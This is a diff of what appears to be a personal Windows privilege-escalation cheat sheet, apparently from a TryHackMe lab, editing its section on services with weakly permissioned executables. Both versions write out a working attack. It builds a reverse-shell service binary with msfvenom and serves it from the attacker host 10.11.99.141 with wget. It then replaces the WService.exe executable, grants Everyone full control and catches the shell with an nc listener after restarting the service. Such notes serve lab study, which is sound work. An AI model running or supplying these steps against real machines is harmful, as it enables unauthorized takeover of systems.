@@ -127,23 +127,26 @@ Get-SmbServerConfiguration # Check the SMB version running on a Windows system (
 
 sc queryex type=service # List of all running services
 ----------------------------------------------------------------
-# Attacking services that have poor executive permits
-sc qc WindowsScheduler # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
-icacls C:\PROGRA~2\SYSTEM~1\WService.exe # We check the executable file of this service has Weak permission or not
-
-# Practical Attack: Replace the service executable file
-1️⃣ Making a malicious Payload with MSFvenom:
+✅ Attacking services that have Weak executive permission 
+1️⃣ Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
+sc qc WindowsScheduler 
+2️⃣ We check the executable file of this service has Weak permission or not
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe 
+3️⃣ Making a malicious Payload with MSFvenom:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4445 -f exe-service -o rev-svc.exe
-2️⃣ Transfer of malicious file to the victim system:
-wget http://10.11.99.141:8000/rev-svc.exe -O rev-svc.exe
-3️⃣ Replace the service executable file:
+4️⃣ Transfer of malicious file to the victim system:
+python3 -m http.server # attackbox
+wget http://10.11.99.141:8000/rev-svc.exe -O rev-svc.exe # target system
+5️⃣ Replace the service executable file ( before copy backup from file ):
+cp C:\PROGRA~2\SYSTEM~1\WService.exe C:\PROGRA~2\SYSTEM~1\WService.exe.bkp
 move C:\Users\thm-unpriv\rev-svc.exe C:\PROGRA~2\SYSTEM~1\WService.exe
-4️⃣ Giving all users permission:
+6️⃣ Giving all users permission:
 icacls C:\PROGRA~2\SYSTEM~1\WService.exe /grant Everyone:F
-5️⃣ start service and get access:
+7️⃣ Launch Lenner on the attackbox
+nc -lvp 4445
+8️⃣ start service and get access:
 sc stop windowsscheduler
 sc start windowsscheduler
-
 ----------------------------------------------------------------
 # Check services through the Windows Registry
 
